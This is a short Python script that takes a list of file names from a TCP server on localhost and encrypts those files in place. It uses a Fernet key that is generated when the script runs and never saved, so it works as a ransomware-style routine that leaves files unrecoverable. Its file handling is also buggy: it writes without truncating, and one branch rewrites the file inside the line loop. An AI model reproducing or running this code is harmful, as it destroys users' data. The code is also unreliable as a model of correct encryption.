import socket
import json
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from termcolor import colored
import tomli as toml

S256: hashes.SHA256 = hashes.SHA256() # Prepare for hashing to have no-knowledge of password
fern: Fernet = Fernet.generate_key() # Discard the knowledge of the key?
fern: Fernet = Fernet(fern)

authentication: dict = dict()
sensitiveData: list = []
encryptedFiles: list = []
savedEncryptionContents: dict = toml.loads(open("encryptedFiles.toml", 'r').read())
print(savedEncryptionContents)

# Create a TCP socket
s: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Define the server address and port
server_address = ('localhost', 3000)

try:
    # Connect to the server
    s.connect(server_address)

    # Receive data from the server
    __data: bytes = s.recv(1024)
    print(__data.decode('utf-8'))  # Print the received message

    s.send("SENSITIVE DATA".encode('utf-8'))

    sensitiveData: str = bytes.decode(s.recv(1024), 'utf-8')
    sensitiveData: list | dict = json.loads(sensitiveData)
    print(sensitiveData)

finally:
    print("waiting...")

    try:
        for e in sensitiveData:
            with open(f"folder/{e}", 'r+') as f:
                __contents: list = f.readlines()

                if not (e in savedEncryptionContents["directories"]["fileInfo"]):
                    print(e)
                    for x in enumerate(__contents):
                        # print(x[0])
                        __contents[x[0]] = str(bytes.decode(fern.encrypt(bytes(x[1], 'utf-8')), 'utf-8'))

                    """
                    for x in enumerate(__contents):
                        #print(x)
                    """

                    print(__contents)
                    f.seek(0)
                    f.writelines(line + "\n" for line in __contents)
                else:
                    print(e)
                    if savedEncryptionContents["directories"]["fileInfo"][e]["encrypted"] == False:
                        for x in enumerate(__contents):
                            # print(x[0])
                            __contents[x[0]] = str(bytes.decode(fern.encrypt(bytes(x[1], 'utf-8')), 'utf-8'))

                            """
                            for x in enumerate(__contents):
                                #print(x)
                            """

                            f.seek(0) # Gotta go back to the top before we write...
                            f.writelines(line + "\n" for line in __contents)
                    else:
                        print(colored(f"This file {e} is already encrypted!", color="red" ,attrs=["bold"]))

    except IOError as e:
        print(f"There was an IOError! {e}")

authentication["Hello World"] = 5